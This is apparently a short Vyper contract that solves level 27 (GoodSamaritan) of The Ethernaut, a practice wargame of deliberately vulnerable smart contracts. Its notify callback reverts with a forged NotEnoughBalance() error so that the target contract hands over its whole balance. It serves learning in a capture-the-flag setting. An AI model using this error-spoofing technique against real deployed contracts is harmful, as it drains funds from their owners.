# pragma version 0.4.0
"""
@title A hack for level 27 (GoodSamaritan) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface GoodSamaritan:
	def requestDonation(): nonpayable


@external
def hack(instance: GoodSamaritan):
	extcall instance.requestDonation()


@external
def notify(amount: uint256):
    if amount == 10:
        raw_revert(method_id("NotEnoughBalance()"))
    return
